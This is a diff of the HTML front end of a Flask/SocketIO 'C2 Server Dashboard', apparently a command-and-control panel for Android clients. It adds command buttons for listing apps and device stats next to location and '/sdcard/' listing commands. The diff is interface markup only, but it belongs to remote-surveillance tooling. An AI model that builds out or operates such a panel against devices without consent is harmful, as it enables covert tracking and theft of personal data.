@@ -41,7 +41,6 @@
 
                 <div id="commandOutput" class="command-output">
                     <div class="welcome-message">
-                        <p>Welcome to C2 Server Dashboard</p>
                         <p>Select a client from the left panel to begin sending commands.</p>
                         <p>Built with Flask + SocketIO for real-time communication</p>
                     </div>
@@ -61,10 +60,12 @@
 
                 <div class="command-suggestions">
                     <span class="suggestion-label">Commands:</span>
-                    <button class="suggestion-btn" data-cmd="ping">ping</button>
                     <button class="suggestion-btn" data-cmd="sys_info">sys_info</button>
                     <button class="suggestion-btn" data-cmd="location">location</button>
+                    <button class="suggestion-btn" data-cmd="apps">apps</button>
+                    <button class="suggestion-btn" data-cmd="user_apps">user_apps</button>
                     <button class="suggestion-btn" data-cmd="battery">battery</button>
+                    <button class="suggestion-btn" data-cmd="device_stats">device_stats</button>
                     <button class="suggestion-btn" data-cmd="ls /sdcard/">ls /sdcard/</button>
                     <details class="suggestion-more">
                         <summary>More commands</summary>
